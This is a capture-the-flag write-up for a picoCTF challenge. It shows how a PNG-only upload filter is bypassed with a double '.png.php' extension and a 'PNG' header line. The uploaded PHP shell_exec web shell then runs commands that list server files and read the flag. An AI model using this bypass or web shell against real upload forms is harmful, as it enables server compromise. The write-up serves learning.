# Solution "Trickster"
This challenge focuses on exploiting File Upload Vulnerabilities to achieve Remote Code Execution (RCE).

## Step 1: Examine the Page
Begin by testing the file upload functionality:
1. Attempt to upload various file formats.
2. Observe that the page only allows PNG files to be uploaded—or so it seems🤨

## Step 2: Use Burp Suit
Since the website likely uses PHP, you can examine its behavior in detail using Burp Suite. Perform the following:

1. Monitor the GET and POST requests when uploading files:
- GET: Retrieve the page and check its contents.
- POST: Handles the file upload process.
2. Send both requests to the Repeater by right clicking on them.

## Step 3: Locate the File Upload Directory
Upload a file (e.g., my_file.png) and determine where it is saved:

- I found it in `GET /uploads/my_file.png HTTP/1.1`

## Step 4: Exploit the Vulnerability
Open the `POST` request and analyze what is going on:
```json
POST / HTTP/1.1
Host: atlas.picoctf.net:59511
/* Some stuff here */

------WebKitFormBoundaryxFd8EmLbtBxtOSTG
Content-Disposition: form-data; name="file"; filename="my_file.png"
Content-Type: image/png
```
Firstly, I tried to save a new file with a different type system, and not surprisingly got an error: `filename="my_file.php"`. But if you add to the file name '.png', surprisingly, server allows it to be uploaded: `filename="my_file.png.php"`

Since the server validates the file type only based on the extension, you can craft a malicious PHP file. To ensure it is treated as valid, include PNG in the first line:

```bash
PNG

<?php echo shell_exec('echo Directory is $(pwd)'); ?>
```

The result was: `Directory is /var/www/html/uploads`

Inside PHP, I used `shell_exec` to be able to use shell commands inside PHP code. It means that we can execute any code we want from now on! So, first thing I did was to examine files I have on the server using `ls -lha /var/www/html`, and it showed me this:
```bash
total 16K
-rw-r--r-- 1 root     root       49 Mar 12  2024 GAZWIMLEGU2DQ.txt
-rw-r--r-- 1 root     root     1.6K Feb  7  2024 index.php
-rw-r--r-- 1 root     root      415 Feb  7  2024 instructions.txt
-rw-r--r-- 1 root     root       62 Feb  7  2024 robots.txt
drwxr-xr-x 1 www-data root       71 Jan 19 16:15 uploads
```

After examining each file, we find a flag in `GAZWIMLEGU2DQ.txt` using `cat ../GAZWIMLEGU2DQ.txt`

Open it and voilà! You can see your flag.
